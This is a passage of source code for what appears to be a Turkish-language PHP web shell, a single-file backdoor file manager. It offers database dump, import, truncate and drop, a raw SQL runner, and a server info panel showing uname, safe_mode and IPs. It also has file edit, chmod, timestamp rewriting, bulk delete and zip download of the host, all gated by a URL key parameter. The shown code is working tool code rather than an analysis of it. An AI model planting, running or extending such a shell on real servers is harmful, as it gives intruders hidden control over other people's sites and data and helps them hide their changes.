                                    <div class="mb-2"><input type="text" name="pass" class="form-control" placeholder="Şifre" value=""></div>
                                    <div class="mb-3"><input type="text" name="db" class="form-control" placeholder="Veritabanı Adı" required></div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-download"></i> İndir (.sql)</button>
                                </form>
                            </div>
                            <div class="tab-pane fade" id="db-import">
                                <form method="POST" action="?action=database_import&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
                                    <div class="mb-2"><input type="text" name="host" class="form-control" value="localhost" placeholder="Host" required></div>
                                    <div class="mb-2"><input type="text" name="user" class="form-control" placeholder="Kullanıcı Adı" required></div>
                                    <div class="mb-2"><input type="text" name="pass" class="form-control" placeholder="Şifre" value=""></div>
                                    <div class="mb-3"><input type="text" name="db" class="form-control" placeholder="Veritabanı Adı" required></div>
                                    <div class="mb-3"><label class="form-label">SQL Dosyası</label><input type="file" name="sql_file" class="form-control" required></div>
                                    <button type="submit" class="btn btn-danger w-100"><i class="bi bi-upload"></i> İçe Aktar</button>
                                </form>
                            </div>
                            <div class="tab-pane fade" id="db-advanced">
                                <?php if (!isset($_SESSION['db_host'])): ?>
                                    <div class="alert alert-warning">Veritabanına bağlanmak için bilgileri girin.</div>
                                    <form method="POST" action="?dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                                        <div class="row g-2 align-items-end">
                                            <div class="col-md-3"><label>Host</label><input type="text" name="host" class="form-control" value="localhost" required></div>
                                            <div class="col-md-3"><label>User</label><input type="text" name="user" class="form-control" required></div>
                                            <div class="col-md-3"><label>Password</label><input type="text" name="pass" class="form-control"></div>
                                            <div class="col-md-2"><label>Database</label><input type="text" name="db" class="form-control" required></div>
                                            <div class="col-md-1"><button type="submit" name="db_connect" class="btn btn-primary w-100">Bağlan</button></div>
                                        </div>
                                    </form>
                                <?php else: ?>
                                    <div class="row">
                                        <div class="col-md-3 db-table-list">
                                            <h6 class="border-bottom pb-2">Tablolar (<?php echo $_SESSION['db_name'] ?? 'Seçilmedi'; ?>)</h6>
                                            <form method="POST" class="mb-2">
                                                <div class="input-group input-group-sm">
                                                    <select name="selected_db" class="form-select db-management">
                                                        <?php echo $db_list_options; ?>
                                                    </select>
                                                    <button type="submit" name="change_db" class="btn btn-outline-primary">Geç</button>
                                                </div>
                                            </form>
                                            <div class="mt-3 mb-3">
                                                <h6 class="border-bottom pb-2">İşlemler</h6>
                                                <ul class="nav nav-pills flex-column" id="dbSubTab" role="tablist">
                                                    <li class="nav-item">
                                                        <a class="nav-link db-table-item" data-bs-toggle="tab" data-bs-target="#db-import-advanced" href="#"><i class="bi bi-file-earmark-arrow-up"></i> İçeri Aktar (.sql)</a>
                                                    </li>
                                                    <li class="nav-item">
                                                        <a class="nav-link db-table-item active" data-bs-toggle="tab" data-bs-target="#db-table-viewer" href="#"><i class="bi bi-table"></i> Tablo Listesi</a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <form method="POST" id="dbTablesForm">
                                                <div class="tab-content">
                                                    <div class="tab-pane fade show active" id="db-table-viewer" role="tabpanel">
                                                        <div class="mb-2">
                                                            <input type="checkbox" id="selectAllTables" onchange="toggleTableSelection()" class="custom-checkbox-style"> <label for="selectAllTables">Tümünü Seç</label>
                                                        </div>
                                                        <div class="list-group list-group-flush mb-3">
                                                            <?php echo $db_output_tables ?: '<span class="text-danger">Tablo yok veya hata.</span>'; ?>
                                                        </div>
                                                        <div class="input-group mb-3">
                                                            <select name="db_action" class="form-select form-select-sm">
                                                                <option value="">İşlem Seç...</option>
                                                                <option value="export_sql">Dışa Aktar (.sql)</option>
                                                                <option value="truncate">İçini Boşalt (Truncate)</option>
                                                                <option value="drop">Sil (Drop)</option>
                                                            </select>
                                                            <button type="submit" class="btn btn-sm btn-secondary" onclick="return confirm('Seçilen tablolar üzerinde toplu işlem yapmak istediğinizden emin misiniz? (Silme ve Boşaltma geri alınamaz!)')">Uygula</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </form>
                                            <form method="POST" class="mt-3"><button type="submit" name="db_logout" class="btn btn-sm btn-outline-danger w-100">Çıkış</button></form>
                                        </div>
                                        <div class="col-md-9">
                                            <div class="tab-content">
                                                <div class="tab-pane fade" id="db-import-advanced" role="tabpanel">
                                                    <h6 class="border-bottom pb-2"><i class="bi bi-file-earmark-arrow-up"></i> SQL Dosyası İçeri Aktar</h6>
                                                    <form method="POST" action="?dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
                                                        <input type="hidden" name="database_import_advanced" value="1">
                                                        <div class="alert alert-info">Veritabanı: **<?php echo $_SESSION['db_name'] ?? ''; ?>**</div>
                                                        <div class="mb-3"><label class="form-label">SQL Dosyası Seç</label><input type="file" name="sql_file" class="form-control" accept=".sql" required></div>
                                                        <button type="submit" class="btn btn-danger w-100"><i class="bi bi-upload"></i> İçe Aktar</button>
                                                    </form>
                                                    <hr>
                                                </div>
                                                <div class="tab-pane fade show active" id="db-table-viewer" role="tabpanel">
                                                    <form method="POST">
                                                        <div class="mb-2">
                                                            <?php 
                                                                $default_sql = "";
                                                                if(isset($_POST['sql_query'])) $default_sql = $_POST['sql_query'];
                                                                elseif(isset($_POST['view_table'])) $default_sql = "SELECT * FROM `" . $db_conn->real_escape_string($_POST['view_table']) . "` LIMIT 100";
                                                            ?>
                                                            <label class="form-label">SQL Sorgusu:</label>
                                                            <textarea name="sql_query" id="sqlQueryBox" class="form-control font-monospace" rows="2" placeholder="SELECT * FROM table..."><?php echo htmlspecialchars($default_sql); ?></textarea>
                                                        </div>
                                                        <button type="submit" class="btn btn-success btn-sm"><i class="bi bi-play-fill"></i> Sorguyu Çalıştır</button>
                                                    </form>
                                                    <hr>
                                                    <?php 
                                                    if(isset($db_error) && $db_error) echo '<div class="alert alert-danger p-2">'.$db_error.'</div>';
                                                    if(isset($db_msg) && $db_msg) echo '<div class="alert alert-success p-2">'.$db_msg.'</div>';
                                                    if(isset($query_error) && $query_error) echo '<div class="alert alert-danger p-2">'.$query_error.'</div>';
                                                    if(isset($sql_result) && $sql_result instanceof mysqli_result): ?>
                                                        <div class="mb-2 d-flex align-items-center gap-2">
                                                            <input type="checkbox" id="selectAllDbRows" onchange="toggleDbRowSelection()" class="custom-checkbox-style">
                                                            <label for="selectAllDbRows" class="mb-0 small">Tümünü Seç</label>
                                                            <button type="button" class="btn btn-danger btn-sm ms-2" onclick="bulkDeleteDbRows()" id="bulkDeleteBtn" style="display:none;">
                                                                <i class="bi bi-trash"></i> Seçilenleri Sil (<span id="selectedDbRowCount">0</span>)
                                                            </button>
                                                        </div>
                                                        <div class="table-responsive">
                                                            <table class="table table-bordered table-sm table-hover" style="font-size:12px;" id="dbResultTable">
                                                                <thead class="table-light"><tr>
                                                                    <th style="width:30px;"><input type="checkbox" id="selectAllDbRowsHeader" onchange="toggleDbRowSelection()" class="custom-checkbox-style"></th>
                                                                    <th>İşlem</th>
                                                                    <?php 
                                                                    $field_names = [];
                                                                    $pk_col = "";
                                                                    $db_conn_temp = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
                                                                    if($db_conn_temp && !$db_conn_temp->connect_error && !empty($active_db_table)) {
                                                                        $fields_res = $db_conn_temp->query("SHOW FULL COLUMNS FROM `" . $db_conn_temp->real_escape_string($active_db_table) . "`");
                                                                        if ($fields_res) {
                                                                            while ($field_info = $fields_res->fetch_assoc()) {
                                                                                if ($field_info['Key'] === 'PRI') {
                                                                                    $pk_col = $field_info['Field'];
                                                                                    break;
                                                                                }
                                                                            }
                                                                        }
                                                                        $db_conn_temp->close();
                                                                    }
                                                                    $fields = $sql_result->fetch_fields();
                                                                    foreach($fields as $finfo) { 
                                                                        $field_names[] = $finfo->name;
                                                                        echo "<th>{$finfo->name}</th>"; 
                                                                    }
                                                                    if (!$pk_col && count($field_names) > 0) $pk_col = $field_names[0]; 
                                                                    ?>
                                                                </tr></thead>
                                                                <tbody>
                                                                    <?php 
                                                                    $rowIndex = 0;
                                                                    while($row = $sql_result->fetch_assoc()): 
                                                                        $rowIndex++;
                                                                        $pk_val = isset($row[$pk_col]) ? $row[$pk_col] : null;
                                                                    ?>
                                                                        <tr id="db-row-<?php echo $rowIndex; ?>" data-pk-val="<?php echo htmlspecialchars($pk_val, ENT_QUOTES); ?>">
                                                                            <td class="text-center">
                                                                                <input type="checkbox" class="db-row-checkbox custom-checkbox-style" data-pk-val="<?php echo htmlspecialchars($pk_val, ENT_QUOTES); ?>" onchange="updateDbRowSelection()">
                                                                            </td>
                                                                            <td class="db-row-actions text-nowrap">
                                                                                <button type="button" class="btn btn-xs btn-warning p-0 px-1 db-edit-btn" onclick="editDbRow(<?php echo $rowIndex; ?>, '<?php echo htmlspecialchars($active_db_table, ENT_QUOTES); ?>')" title="Düzenle"><i class="bi bi-pencil-square"></i></button>
                                                                                <button type="button" class="btn btn-xs btn-success p-0 px-1 db-save-btn" onclick="saveDbRow(<?php echo $rowIndex; ?>, '<?php echo htmlspecialchars($active_db_table, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($pk_col, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($pk_val, ENT_QUOTES); ?>')" style="display:none;" title="Kaydet"><i class="bi bi-save"></i></button>
                                                                                <?php if ($pk_col): ?>
                                                                                    <button type="button" class="btn btn-xs btn-danger p-0 px-1 db-delete-btn" onclick="if(confirm('Seçili satırı silmek istediğinizden emin misiniz?')) dbRowAction('delete', '<?php echo htmlspecialchars($active_db_table, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($pk_col, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($pk_val, ENT_QUOTES); ?>')" title="Sil"><i class="bi bi-trash"></i></button>
                                                                                <?php endif; ?>
                                                                            </td>
                                                                            <?php foreach($row as $col => $val): ?>
                                                                                <td class="db-cell" data-col="<?php echo htmlspecialchars($col, ENT_QUOTES); ?>" data-val="<?php echo htmlspecialchars(substr($val ?? 'NULL', 0, 100) ?? '', ENT_QUOTES); ?>"><?php echo htmlspecialchars(substr($val ?? 'NULL', 0, 100)); ?></td>
                                                                            <?php endforeach; ?>
                                                                        </tr>
                                                                    <?php endwhile; ?>
                                                                </tbody>
                                                            </table>
                                                            <p class="text-muted small"><?php echo $sql_result->num_rows; ?> satır döndü. <?php if ($pk_col) echo "PK: " . htmlspecialchars($pk_col); ?></p>
                                                            <input type="hidden" id="currentDbTable" value="<?php echo htmlspecialchars($active_db_table, ENT_QUOTES); ?>">
                                                            <input type="hidden" id="currentDbPkCol" value="<?php echo htmlspecialchars($pk_col, ENT_QUOTES); ?>">
                                                        </div>
                                                    <?php elseif(isset($query_success) && $query_success): ?>
                                                        <div class="alert alert-success p-2">Sorgu başarıyla çalıştırıldı.</div>
                                                    <?php endif; ?>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="encryptModal" tabindex="-1" aria-labelledby="encryptModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="encryptModalLabel"><i class="bi bi-key"></i> Şifreleme Araçları</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="encryptInput" class="form-label">Şifrelenecek Metin</label>
                            <input type="text" class="form-control" id="encryptInput" placeholder="Örn: 123" onkeyup="if(event.key === 'Enter') generateHashes()">
                        </div>
                        <hr>
                        <div class="hash-results-container" id="hashResults"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" onclick="generateHashes()"><i class="bi bi-gear-fill"></i> Şifrele</button>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-labelledby="serverInfoModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="serverInfoModalLabel"><i class="bi bi-info-circle"></i> Sunucu Bilgileri</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body" id="serverInfoContent"></div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="zipDownloadModal" tabindex="-1" aria-labelledby="zipDownloadModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-success text-white">
                        <h5 class="modal-title" id="zipDownloadModalLabel"><i class="bi bi-file-zip"></i> Seçilenleri Ziple İndir</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="" id="zipDownloadFormFinal">
                        <input type="hidden" name="files" id="filesToZipInput">
                        <input type="hidden" name="action" id="zipActionType">
                        <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
                        <input type="hidden" name="dir" value="<?php echo encPath($currentDir); ?>">
                        <div class="modal-body">
                            <p class="mb-2"><span id="zipFileCount" class="fw-bold">0</span> öğe indirilecek.</p>
                            <label for="zipFilenameInput" class="form-label">Zip Dosyası Adı</label>
                            <input type="text" class="form-control" name="zip_filename" id="zipFilenameInput" required>
                            <small class="text-muted">Lütfen uzantıyı (.zip) ekleyin. Varsayılan: <?php echo getHostBaseName() . '.zip'; ?></small>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-success"><i class="bi bi-download"></i> İndirmeyi Başlat</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script>
        let selectedFiles = [];
        let searchTimeout = null;
        let editor;
        let activeDbTable = '<?php echo $active_db_table; ?>';
        const IS_RECURSIVE_MODE = '<?php echo $isRecursiveMode ? 'true' : 'false'; ?>';
        const IS_SEARCH_CONTENT_RECURSIVE = '<?php echo $isSearchContentRecursive ? 'true' : 'false'; ?>';
        const HOST_BASE_NAME = '<?php echo addslashes($hostBaseNameForJs); ?>';
        function getAceMode(fileName) {
            const ext = fileName.split('.').pop().toLowerCase();
            const modes = {'php': 'php', 'html': 'html', 'htm': 'html', 'css': 'css', 'js': 'javascript', 'json': 'json', 'xml': 'xml', 'txt': 'text', 'sql': 'sql', 'py': 'python', 'rb': 'ruby', 'java': 'java', 'c': 'c_cpp', 'cpp': 'c_cpp', 'md': 'markdown'};
            return "ace/mode/" + (modes[ext] || 'text');
        }
        let isEditFullscreen = false;
        let currentEditingFileName = '';
        function toggleEditFullscreen() {
            const editorContainer = document.getElementById('editor');
            const modal = document.getElementById('editModal');
            const modalDialog = modal.querySelector('.modal-dialog');
            const modalContent = modal.querySelector('.modal-content');
            const modalBody = modal.querySelector('.modal-body');
            const modalFooter = modal.querySelector('.modal-footer');
            const modalHeader = modal.querySelector('.modal-header');
            const fullscreenBtn = document.getElementById('fullscreenToggleBtn');
            if (!isEditFullscreen) {
                modalDialog.style.cssText = 'max-width:100%;width:100%;height:100%;margin:0;';
                modalContent.style.cssText = 'height:100%;border-radius:0;';
                modalBody.style.cssText = 'height:calc(100vh - 130px);padding:0;';
                editorContainer.style.cssText = 'height:100%!important;border-radius:0;';
                modalFooter.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:#fff;z-index:10;';
                modalHeader.style.cssText = 'position:sticky;top:0;z-index:10;background:#fff;';
                fullscreenBtn.innerHTML = '<i class="bi bi-fullscreen-exit"></i>';
                fullscreenBtn.title = 'Küçült';
                isEditFullscreen = true;
            } else {
                modalDialog.style.cssText = '';
                modalContent.style.cssText = '';
                modalBody.style.cssText = '';
                editorContainer.style.cssText = 'height:60vh;border:1px solid #ccc;border-radius:4px;width:100%;';
                modalFooter.style.cssText = '';
                modalHeader.style.cssText = '';
                fullscreenBtn.innerHTML = '<i class="bi bi-arrows-fullscreen"></i>';
                fullscreenBtn.title = 'Tam Ekran';
                isEditFullscreen = false;
            }
            if (editor) editor.resize();
        }
        document.getElementById('fullscreenToggleBtn').addEventListener('click', toggleEditFullscreen);
        let filenameTooltip = null;
        document.getElementById('mobileFileInfoBtn').addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            if (filenameTooltip) { filenameTooltip.remove(); filenameTooltip = null; return; }
            filenameTooltip = document.createElement('div');
            filenameTooltip.className = 'filename-tooltip';
            filenameTooltip.textContent = currentEditingFileName;
            filenameTooltip.style.top = (e.clientY + 10) + 'px';
            filenameTooltip.style.left = '10px';
            filenameTooltip.style.right = '10px';
            document.body.appendChild(filenameTooltip);
            setTimeout(function() { if (filenameTooltip) { filenameTooltip.remove(); filenameTooltip = null; } }, 5000);
        });
        document.addEventListener('click', function(e) { if (filenameTooltip && !e.target.closest('#mobileFileInfoBtn')) { filenameTooltip.remove(); filenameTooltip = null; } });
        function openEditModal(encodedFileName) {
            const editModalEl = document.getElementById('editModal');
            const editModal = bootstrap.Modal.getInstance(editModalEl) || new bootstrap.Modal(editModalEl);
            const row = document.querySelector(`tr[data-file-path="${encodedFileName.replace(/"/g, '&quot;')}"]`);
            if (row) {
                const fileType = row.getAttribute('data-file-type');
                if (fileType === 'dir') { alert("Dizinler düzenlenemez!"); return; }
            }
            if (!editor) {
                editor = ace.edit("editor"); editor.setTheme("ace/theme/monokai"); editor.setFontSize(14); editor.setShowPrintMargin(false);
                editor.commands.addCommand({ name: 'saveFile', bindKey: {win: 'Ctrl-S', mac: 'Command-S'}, exec: function(editor) { document.getElementById('editForm').querySelector('button[type="submit"]').click(); } });
            }
            let displayFileName = row ? row.getAttribute('data-file-name') : encodedFileName;
            currentEditingFileName = displayFileName;
            document.getElementById('modalFileName').textContent = displayFileName;
            document.getElementById('editFileName').value = encodedFileName;
            editor.setValue('Yükleniyor...');
            editor.getSession().setMode(getAceMode(displayFileName));
            fetch(`?action=get_file_content&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodeURIComponent(encodedFileName)}`).then(response => {
                if (!response.ok) return response.json().then(err => { throw new Error(err.error || 'Bilinmeyen Hata'); });
                return response.json();
            }).then(data => {
                editor.setValue(data.content, -1);
                document.getElementById('filePermsDisplay').textContent = data.perms || '-';
                document.getElementById('fileMTimeDisplay').textContent = data.mtime || '-';
                document.getElementById('headerFileUrl').href = data.url || '#';
                document.getElementById('fileUrlDisplay').href = data.url || '#';
                document.getElementById('fileUrlDisplay').textContent = data.url || 'URL Yok';
                editModal.show();
            }).catch(error => {
                const errorMessage = 'Hata: Dosya içeriği yüklenemedi: ' + error.message;
                editor.setValue(errorMessage);
                alert(errorMessage);
                editModal.show();
            });
        }
        document.getElementById('editForm').onsubmit = function() { if (editor) document.getElementById('fileContent').value = editor.getValue(); return true; };
        document.getElementById('editModal').addEventListener('hidden.bs.modal', function() {
            if (isEditFullscreen) { toggleEditFullscreen(); }
            if (filenameTooltip) { filenameTooltip.remove(); filenameTooltip = null; }
        });
        function previewImage(url) {
            const modalEl = document.getElementById('previewModal');
            const modalImg = document.getElementById('previewImage');
            modalImg.src = url;
            const modal = new bootstrap.Modal(modalEl);
            modal.show();
        }
        function setSingleActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length !== 1) { 
                alert("Lütfen sadece bir dosya seçin!"); 
                return false; 
            }
            const filePath = selectedFiles[0]; 
            const row = document.querySelector(`tr[data-file-path="${filePath.replace(/"/g, '&quot;')}"]`);
            if (!row) return false;
            const fileDisplay = row.getAttribute('data-file-name');
            const modalId = `#${action}Modal`;
            const modalEl = document.querySelector(modalId);
            const modalInstance = bootstrap.Modal.getInstance(modalEl) || new bootstrap.Modal(modalEl);
            if (action === 'rename') {
                document.getElementById('renameOldName').value = filePath;
                document.getElementById('renameOldNameDisplay').textContent = fileDisplay;
                document.getElementById('renameNewName').value = fileDisplay;
            } else if (action === 'chmod') {
                const perms = row.getAttribute('data-perms');
                document.getElementById('chmodFileName').value = filePath;
                document.getElementById('chmodFileNameDisplay').textContent = fileDisplay;
                document.getElementById('chmodOldPerms').textContent = perms;
                document.getElementById('chmodNewPerms').value = perms;
            } else if (action === 'touch') {
                const mtime = row.getAttribute('data-mtime');
                document.getElementById('touchFileName').value = filePath;
                document.getElementById('touchFileNameDisplay').textContent = fileDisplay;
                document.getElementById('touchOldMtime').textContent = mtime;
                if (mtime) document.getElementById('touchNewMtime').value = mtime.replace(' ', 'T');
            } else if (action === 'edit') {
                openEditModal(filePath);
                return true; 
            }
            modalInstance.show();
            return true;
        }
        function setTopluActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) { alert("Lütfen en az bir dosya veya klasör seçin!"); return false; }
            const fileListString = selectedFiles.join('|||');
            const lastPath = localStorage.getItem('lastCopiedPath');
            const modalId = `#${action}Modal`;
            const modalEl = document.querySelector(modalId);
            const modalInstance = bootstrap.Modal.getInstance(modalEl) || new bootstrap.Modal(modalEl);
            if (action === 'move') {
                document.getElementById('moveFileCount').textContent = selectedFiles.length;
                document.getElementById('moveFileNames').value = fileListString;
                document.getElementById('moveDestination').value = ''; 
                if (lastPath) {
                    document.getElementById('lastPathDisplayMove').textContent = lastPath;
                    document.getElementById('moveLastPathContainer').style.display = 'block';
                    document.getElementById('useLastPathMove').checked = false; 
                } else {
                    document.getElementById('moveLastPathContainer').style.display = 'none';
                }
            } else if (action === 'copy') {
                document.getElementById('copyFileCount').textContent = selectedFiles.length;
                document.getElementById('copyFileNames').value = fileListString;
                document.getElementById('copyDestination').value = ''; 
                if (lastPath) {
                    document.getElementById('lastPathDisplayCopy').textContent = lastPath;
                    document.getElementById('copyLastPathContainer').style.display = 'block';
                    document.getElementById('useLastPathCopy').checked = false;
                } else {
                    document.getElementById('copyLastPathContainer').style.display = 'none';
                }
            }
            modalInstance.show();
            return true;
        }
        function applyLastPath(actionType) {
            const checkbox = document.getElementById('useLastPath' + (actionType === 'move' ? 'Move' : 'Copy'));
            const destinationInput = document.getElementById(actionType + 'Destination');
            const lastPath = localStorage.getItem('lastCopiedPath');
            if (checkbox.checked && lastPath) {
                destinationInput.value = lastPath;
            } else if (!checkbox.checked && destinationInput.value === lastPath) {
                destinationInput.value = '';
            }
        }
        document.getElementById('moveForm').onsubmit = function() {
            const fileNamesInput = document.getElementById('moveFileNames');
            const fileNames = fileNamesInput.value.split('|||');
            fileNamesInput.value = ''; 
            fileNames.forEach(name => {
                const fileInput = document.createElement('input');
                fileInput.type = 'hidden';
                fileInput.name = 'files[]';
                fileInput.value = name;
                this.appendChild(fileInput);
            });
            return true;
        };
        document.getElementById('copyForm').onsubmit = function() {
            const fileNamesInput = document.getElementById('copyFileNames');
            const fileNames = fileNamesInput.value.split('|||');
            fileNamesInput.value = '';
            fileNames.forEach(name => {
                const fileInput = document.createElement('input');
                fileInput.type = 'hidden';
                fileInput.name = 'files[]';
                fileInput.value = name;
                this.appendChild(fileInput);
            });
            return true;
        };
        function openZipDownloadModal(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) {
                alert("Lütfen en az bir dosya veya klasör seçin!");
                return;
            }
            const modal = new bootstrap.Modal(document.getElementById('zipDownloadModal'));
            document.getElementById('filesToZipInput').value = selectedFiles.join('|||');
            document.getElementById('zipActionType').value = action;
            document.getElementById('zipDownloadFormFinal').action = `?action=${action}&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
            document.getElementById('zipFileCount').textContent = selectedFiles.length;
            let defaultName;
            if (selectedFiles.length === 1) {
                const row = document.querySelector(`tr[data-file-path="${selectedFiles[0].replace(/"/g, '&quot;')}"]`);
                const fileName = row ? row.getAttribute('data-file-name') : 'archive';
                let cleanName = fileName.includes('.') ? fileName.replace(/\.[^/.]+$/, "") : fileName; 
                defaultName = cleanName + '.zip';
            } else {
                defaultName = HOST_BASE_NAME + '.zip';
            }
            document.getElementById('zipFilenameInput').value = defaultName.replace(/[^a-zA-Z0-9_\-\.]/g, ''); 
            modal.show();
        }
        document.getElementById('zipDownloadFormFinal').onsubmit = function() {
            const fileNamesInput = document.getElementById('filesToZipInput');
            const fileNames = fileNamesInput.value.split('|||');
            this.querySelectorAll('input[name="files[]"]').forEach(input => input.remove());
            fileNames.forEach(name => {
                const fileInput = document.createElement('input');
                fileInput.type = 'hidden';
                fileInput.name = 'files[]';
                fileInput.value = name;
                this.appendChild(fileInput);
            });
            fileNamesInput.value = '';
            document.getElementById('zipActionType').value = '';
            return true;
        };
        function performTopluAction(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) { alert("Lütfen en az bir dosya veya klasör seçin!"); return; }
            let confirmed = true;
            if (action === 'delete') confirmed = confirm(`${selectedFiles.length} dosya/klasör silmek istediğinize emin misiniz?`);
            if (confirmed || action === 'download' || action === 'unzip' || action === 'sunucuyaziple') {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `?action=${action}&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
                selectedFiles.forEach(fileName => {
                    const fileInput = document.createElement('input');
                    fileInput.type = 'hidden'; fileInput.name = 'files[]'; fileInput.value = fileName;
                    form.appendChild(fileInput);
                });
                const openModals = document.querySelectorAll('.modal.show');
                openModals.forEach(modalEl => {
                    const modalInstance = bootstrap.Modal.getInstance(modalEl);
                    if(modalInstance) modalInstance.hide();
                });
                document.body.appendChild(form); 
                form.submit();
            }
        }
        function copyCurrentPath(path) {
            navigator.clipboard.writeText(path).then(() => { 
                localStorage.setItem('lastCopiedPath', path); 
                showToast('Dizin yolu kopyalandı!', 'success'); 
            }).catch(() => { showToast('Kopyalama başarısız!', 'danger'); });
        }
        function toggleFolderCreation() {
            const isChecked = document.getElementById('createFolderToggle').checked;
            const folderInputDiv = document.getElementById('folderNameInput');
            if (isChecked) folderInputDiv.style.display = 'block'; else { folderInputDiv.style.display = 'none'; document.getElementById('uploadFolderName').value = ''; updateUploadFolderInputs(); }
            document.getElementById('fileUploadFolderFlag').value = isChecked ? 'yes' : 'no';
            document.getElementById('urlUploadFolderFlag').value = isChecked ? 'yes' : 'no';
        }
        function updateUploadFolderInputs() {
            const val = document.getElementById('uploadFolderName').value;
            document.getElementById('fileUploadFolderName').value = val;
            document.getElementById('urlUploadFolderName').value = val;
        }
        function copyToClipboard(text) { navigator.clipboard.writeText(text).then(() => { showToast('Kopyalandı!', 'success'); }).catch(() => { showToast('Kopyalama başarısız!', 'danger'); }); }
        function showToast(message, type = 'info') {
            const container = document.querySelector('.toast-container');
            const toast = document.createElement('div');
            toast.className = `toast align-items-center text-white bg-${type} border-0`;
            toast.setAttribute('role', 'alert'); toast.setAttribute('aria-live', 'assertive'); toast.setAttribute('data-bs-autohide', 'true'); toast.setAttribute('data-bs-delay', '3000');
            toast.innerHTML = `<div class="d-flex"><div class="toast-body"><i class="bi bi-info-circle"></i> ${message}</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>`;
            container.appendChild(toast);
            const bsToast = new bootstrap.Toast(toast); bsToast.show();
            toast.addEventListener('hidden.bs.toast', () => { toast.remove(); });
        }
        function showServerInfo() {
            const serverInfoContent = document.getElementById('serverInfoContent');
            const serverInfo = <?php 
                $info = getServerInfo();
                $hddUsed = $info['hdd_total'] - $info['hdd_free'];
                $hddPercent = $info['hdd_total'] > 0 ? round(($hddUsed / $info['hdd_total']) * 100) : 0;
                $hddFreePercent = 100 - $hddPercent;
                echo json_encode(['uname' => $info['uname'], 'user_id' => $info['user_id'], 'php_version' => $info['php_version'], 'safe_mode' => $info['safe_mode'], 'server_ip' => $info['server_ip'], 'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'datetime' => date('d.m.Y - H:i'), 'hdd_total' => formatSize($info['hdd_total']), 'hdd_free' => formatSize($info['hdd_free']), 'hdd_percent' => $hddPercent, 'hdd_free_percent' => $hddFreePercent]);
            ?>;
            let barColor = 'bg-success';
            if(serverInfo.hdd_percent > 50) barColor = 'bg-warning';
            if(serverInfo.hdd_percent > 85) barColor = 'bg-danger';
